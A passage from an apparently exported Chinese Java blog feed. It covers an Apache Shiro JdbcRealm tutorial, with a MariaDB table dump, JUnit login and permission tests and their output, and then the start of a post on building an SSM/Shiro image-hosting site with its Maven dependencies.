*/;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, &apos;&apos;) */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br></pre></td></tr></table></figure></div><h3 id="测试Code-3"><a href="#测试Code-3" class="headerlink" title="测试Code"></a>测试Code</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package com.imgurl;</span><br><span class="line"></span><br><span class="line">import com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.AuthenticationException;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Test;</span><br><span class="line">import org.apache.shiro.realm.jdbc.JdbcRealm;</span><br><span class="line"></span><br><span class="line">import java.util.Arrays;</span><br><span class="line"></span><br><span class="line">public class TestJdbcRealm &#123;</span><br><span class="line">    DruidDataSource datasource = new DruidDataSource();</span><br><span class="line">    &#123;</span><br><span class="line">        datasource.setUrl(&quot;jdbc:mysql://localhost:3306/test&quot;);</span><br><span class="line">        datasource.setUsername(&quot;root&quot;);</span><br><span class="line">        datasource.setPassword(&quot;root&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void JdbcRealmTest()&#123;</span><br><span class="line">//        1.创建JdbcRealm</span><br><span class="line">        JdbcRealm jdbcRealm = new JdbcRealm();</span><br><span class="line">        jdbcRealm.setDataSource(datasource);  //设置数据源</span><br><span class="line">        jdbcRealm.setPermissionsLookupEnabled(true);  //设置可查看用户权限</span><br><span class="line"></span><br><span class="line">//        2.创建安全管理器</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(jdbcRealm);</span><br><span class="line"></span><br><span class="line">//        3.主题请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">//        4.用户认证</span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;admin&quot;,&quot;123456&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line">            System.out.println(&quot;登录成功&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;--------角色验证---------&quot;);</span><br><span class="line">            System.out.println(&quot;是否具备Manger权限：&quot;+subject.hasRole(&quot;Manager&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备Otheruser权限：&quot;+subject.hasRole(&quot;Otheruser&quot;));</span><br><span class="line">            System.out.println(&quot;是否同事具备Manger和Otheruser权限：&quot;+subject.hasAllRoles(Arrays.asList(&quot;Manager&quot;,&quot;Otheruser&quot;)));</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;---------权限------------&quot;);</span><br><span class="line">            System.out.println(&quot;是否具备user:select权限：&quot;+subject.isPermitted(&quot;user:select&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备user:add权限：&quot;+subject.isPermitted(&quot;user:add&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备user:delete权限：&quot;+subject.isPermitted(&quot;user:delete&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备user:update权限：&quot;+subject.isPermitted(&quot;user:update&quot;));</span><br><span class="line">        &#125;catch (AuthenticationException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(&quot;登录失败&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">登录成功</span><br><span class="line">--------角色验证---------</span><br><span class="line">是否具备Manger权限：true</span><br><span class="line">是否具备Otheruser权限：false</span><br><span class="line">是否同事具备Manger和Otheruser权限：false</span><br><span class="line">---------权限------------</span><br><span class="line">是否具备user:select权限：true</span><br><span class="line">是否具备user:add权限：true</span><br><span class="line">是否具备user:delete权限：true</span><br><span class="line">是否具备user:update权限：true</span><br></pre></td></tr></table></figure></div><p>你会发现我们利用数据库也发现有mysql语句啊。因为我们使用了JdbcRealm的内置语句。我们是按照它语句来命名数据表字段的。下面是代码片段</p><blockquote><p> JdbcRealm.class  </p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class JdbcRealm extends AuthorizingRealm &#123;</span><br><span class="line">    protected static final String DEFAULT_AUTHENTICATION_QUERY = &quot;select password from users where username = ?&quot;;</span><br><span class="line">    protected static final String DEFAULT_SALTED_AUTHENTICATION_QUERY = &quot;select password, password_salt from users where username = ?&quot;;</span><br><span class="line">    protected static final String DEFAULT_USER_ROLES_QUERY = &quot;select role_name from user_roles where username = ?&quot;;</span><br><span class="line">    protected static final String DEFAULT_PERMISSIONS_QUERY = &quot;select permission from roles_permissions where role_name = ?&quot;;</span><br><span class="line">    private static final Logger log = LoggerFactory.getLogger(JdbcRealm.class);</span><br><span class="line">    protected DataSource dataSource;</span><br><span class="line">    protected String authenticationQuery = &quot;select password from users where username = ?&quot;;</span><br><span class="line">    protected String userRolesQuery = &quot;select role_name from user_roles where username = ?&quot;;</span><br><span class="line">    protected String permissionsQuery = &quot;select permission from roles_permissions where role_name = ?&quot;;</span><br><span class="line">    protected boolean permissionsLookupEnabled = false;</span><br><span class="line">    protected JdbcRealm.SaltStyle saltStyle;</span><br></pre></td></tr></table></figure></div><h3 id="自定义数据库及语句"><a href="#自定义数据库及语句" class="headerlink" title="自定义数据库及语句"></a>自定义数据库及语句</h3><h4 id="创建新表"><a href="#创建新表" class="headerlink" title="创建新表"></a>创建新表</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">-- --------------------------------------------------------</span><br><span class="line">-- 主机:                           127.0.0.1</span><br><span class="line">-- 服务器版本:                        10.3.10-MariaDB - mariadb.org binary distribution</span><br><span class="line">-- 服务器操作系统:                      Win64</span><br><span class="line">-- HeidiSQL 版本:                  9.4.0.5125</span><br><span class="line">-- --------------------------------------------------------</span><br><span class="line"></span><br><span class="line">/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;</span><br><span class="line">/*!40101 SET NAMES utf8 */;</span><br><span class="line">/*!50503 SET NAMES utf8mb4 */;</span><br><span class="line">/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;</span><br><span class="line">/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&apos;NO_AUTO_VALUE_ON_ZERO&apos; */;</span><br><span class="line"></span><br><span class="line">-- 导出  表 shirotest.sys_permissions 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `sys_permissions` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `role_name` varchar(50) DEFAULT &apos;0&apos;,</span><br><span class="line">  `permission` varchar(50) DEFAULT &apos;0&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `permissions` (`role_name`,`permission`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 正在导出表  shirotest.sys_permissions 的数据：~2 rows (大约)</span><br><span class="line">/*!40000 ALTER TABLE `sys_permissions` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `sys_permissions` (`id`, `role_name`, `permission`) VALUES</span><br><span class="line">(1, &apos;root&apos;, &apos;user:add&apos;),</span><br><span class="line">(2, &apos;root&apos;, &apos;user:delete&apos;),</span><br><span class="line">(4, &apos;root&apos;, &apos;user:select&apos;),</span><br><span class="line">(3, &apos;root&apos;, &apos;user:update&apos;),</span><br><span class="line">(5, &apos;user&apos;, &apos;user:select&apos;);</span><br><span class="line">/*!40000 ALTER TABLE `sys_permissions` ENABLE KEYS */;</span><br><span class="line"></span><br><span class="line">-- 导出  表 shirotest.sys_roles 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `sys_roles` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;ID&apos;,</span><br><span class="line">  `username` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;用户名&apos;,</span><br><span class="line">  `role_name` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;角色名称&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `username_rolename` (`username`,`role_name`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 正在导出表  shirotest.sys_roles 的数据：~2 rows (大约)</span><br><span class="line">/*!40000 ALTER TABLE `sys_roles` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `sys_roles` (`id`, `username`, `role_name`) VALUES</span><br><span class="line">(1, &apos;admin&apos;, &apos;root&apos;),</span><br><span class="line">(2, &apos;fun&apos;, &apos;user&apos;);</span><br><span class="line">/*!40000 ALTER TABLE `sys_roles` ENABLE KEYS */;</span><br><span class="line"></span><br><span class="line">-- 导出  表 shirotest.sys_users 结构</span><br><span class="line">CREATE TABLE IF NOT EXISTS `sys_users` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT &apos;用户ID&apos;,</span><br><span class="line">  `username` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;用户名&apos;,</span><br><span class="line">  `password` varchar(50) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;用户密码&apos;,</span><br><span class="line">  `salt` varchar(100) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;盐值&apos;,</span><br><span class="line">  `last_ip` varchar(100) NOT NULL DEFAULT &apos;0&apos; COMMENT &apos;最后登录IP&apos;,</span><br><span class="line">  PRIMARY KEY (`id`),</span><br><span class="line">  UNIQUE KEY `user_username` (`username`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;</span><br><span class="line"></span><br><span class="line">-- 正在导出表  shirotest.sys_users 的数据：~2 rows (大约)</span><br><span class="line">/*!40000 ALTER TABLE `sys_users` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `sys_users` (`id`, `username`, `password`, `salt`, `last_ip`) VALUES</span><br><span class="line">(1, &apos;admin&apos;, &apos;123456&apos;, &apos;0&apos;, &apos;0&apos;),</span><br><span class="line">(2, &apos;fun&apos;, &apos;123456&apos;, &apos;0&apos;, &apos;0&apos;);</span><br><span class="line">/*!40000 ALTER TABLE `sys_users` ENABLE KEYS */;</span><br><span class="line"></span><br><span class="line">/*!40101 SET SQL_MODE=IFNULL(@OLD_SQL_MODE, &apos;&apos;) */;</span><br><span class="line">/*!40014 SET FOREIGN_KEY_CHECKS=IF(@OLD_FOREIGN_KEY_CHECKS IS NULL, 1, @OLD_FOREIGN_KEY_CHECKS) */;</span><br><span class="line">/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;</span><br></pre></td></tr></table></figure></div><p>其实数据库都差不多，只是没有按照内置的命名。</p><h3 id="测试Code-4"><a href="#测试Code-4" class="headerlink" title="测试Code"></a>测试Code</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">package com.imgurl;</span><br><span class="line"></span><br><span class="line">import com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line">import org.apache.shiro.SecurityUtils;</span><br><span class="line">import org.apache.shiro.authc.AuthenticationException;</span><br><span class="line">import org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line">import org.apache.shiro.mgt.DefaultSecurityManager;</span><br><span class="line">import org.apache.shiro.realm.jdbc.JdbcRealm;</span><br><span class="line">import org.apache.shiro.subject.Subject;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.util.Arrays;</span><br><span class="line"></span><br><span class="line">public class CustomizeJdbcRealm &#123;</span><br><span class="line">    DruidDataSource datasource = new DruidDataSource();</span><br><span class="line">    &#123;</span><br><span class="line">        datasource.setUrl(&quot;jdbc:mysql://localhost:3306/shirotest&quot;);</span><br><span class="line">        datasource.setUsername(&quot;root&quot;);</span><br><span class="line">        datasource.setPassword(&quot;root&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Test</span><br><span class="line">    public void CustomizeJdbcRealmTest()&#123;</span><br><span class="line">//        1.创建JdbcRealm</span><br><span class="line">        JdbcRealm jdbcRealm = new JdbcRealm();</span><br><span class="line">        jdbcRealm.setDataSource(datasource);</span><br><span class="line">        jdbcRealm.setPermissionsLookupEnabled(true);</span><br><span class="line"></span><br><span class="line">        String sql = &quot;select password from sys_users where username = ?&quot;;</span><br><span class="line">        jdbcRealm.setAuthenticationQuery(sql);</span><br><span class="line"></span><br><span class="line">        String rolesql = &quot;select role_name from sys_roles where username = ?&quot;;</span><br><span class="line">        jdbcRealm.setUserRolesQuery(rolesql);</span><br><span class="line"></span><br><span class="line">        String permissionsql = &quot;select permission from sys_permissions where role_name = ?&quot;;</span><br><span class="line">        jdbcRealm.setPermissionsQuery(permissionsql);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//        2.创建安全管理器</span><br><span class="line">        DefaultSecurityManager defaultSecurityManager = new DefaultSecurityManager();</span><br><span class="line">        defaultSecurityManager.setRealm(jdbcRealm);</span><br><span class="line"></span><br><span class="line">//        2.主体请求</span><br><span class="line">        SecurityUtils.setSecurityManager(defaultSecurityManager);</span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line"></span><br><span class="line">//        3.认证</span><br><span class="line">        UsernamePasswordToken token = new UsernamePasswordToken(&quot;fun&quot;,&quot;123456&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            subject.login(token);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;认证是否成功：&quot;+subject.isAuthenticated());</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;--------角色验证---------&quot;);</span><br><span class="line">            System.out.println(&quot;是否具备root权限：&quot;+subject.hasRole(&quot;root&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备user权限：&quot;+subject.hasRole(&quot;user&quot;));</span><br><span class="line">            System.out.println(&quot;是否同事具备root和user权限：&quot;+subject.hasAllRoles(Arrays.asList(&quot;root&quot;,&quot;user&quot;)));</span><br><span class="line">            System.out.println(&quot;---------权限------------&quot;);</span><br><span class="line">            System.out.println(&quot;是否具备user:select权限：&quot;+subject.isPermitted(&quot;user:select&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备user:add权限：&quot;+subject.isPermitted(&quot;user:add&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备user:delete权限：&quot;+subject.isPermitted(&quot;user:delete&quot;));</span><br><span class="line">            System.out.println(&quot;是否具备user:update权限：&quot;+subject.isPermitted(&quot;user:update&quot;));</span><br><span class="line">        &#125;catch (AuthenticationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(&quot;认证失败&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">认证是否成功：true</span><br><span class="line">--------角色验证---------</span><br><span class="line">是否具备root权限：false</span><br><span class="line">是否具备user权限：true</span><br><span class="line">是否同事具备root和user权限：false</span><br><span class="line">---------权限------------</span><br><span class="line">是否具备user:select权限：true</span><br><span class="line">是否具备user:add权限：false</span><br><span class="line">是否具备user:delete权限：false</span><br><span class="line">是否具备user:update权限：false</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaのImgUrl</title>
      <link href="/2019/05/05/javanoimgurl/"/>
      <url>/2019/05/05/javanoimgurl/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaのImgUrl"><a href="#JavaのImgUrl" class="headerlink" title="JavaのImgUrl"></a>JavaのImgUrl</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>简单的一个图床网站。需要注册才能上传文件，管理员可以无限制的上传图片，普通注册用户一天只能5张图片。</p><h2 id="创建环境"><a href="#创建环境" class="headerlink" title="创建环境"></a>创建环境</h2><ul><li>编辑器：IDEA</li><li>数据库：MariaDB</li><li>后端框架：SSM+Shiro</li><li>前端框架：Boostrap + Flat UI</li><li>服务器：Tomcat8.5以上</li></ul><h2 id="1-项目步骤"><a href="#1-项目步骤" class="headerlink" title="1.项目步骤"></a>1.项目步骤</h2><h3 id="1-1Maven创建项目"><a href="#1-1Maven创建项目" class="headerlink" title="1.1Maven创建项目"></a>1.1Maven创建项目</h3><blockquote><p><a href="https://kalifun.top/archives/184" target="_blank" rel="noopener">IDEA 简单创建SSM框架</a></p></blockquote><h3 id="1-2修改pom-xml"><a href="#1-2修改pom-xml" class="headerlink" title="1.2修改pom.xml"></a>1.2修改pom.xml</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-spring --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-ehcache --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;shiro-ehcache&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-quartz --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;shiro-quartz&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-web --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.shiro/shiro-core --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--excel--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.poi&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;poi&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;jstl&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.github.pagehelper/pagehelper --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.github.pagehelper&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;pagehelper&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;4.1.6&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;log4j&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;log4j&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.2.17&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div><p> 将项目需要使用的包先导入，后期导入也没关系。但是springmvc，jdbc，shiro需要提前导入，方便修改web.xml文件。</p><h3 id="1-3修改web-xml"><a href="#1-3修改web-xml" class="headerlink" title="1.3修改web.xml"></a>1.3修改web.xml</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 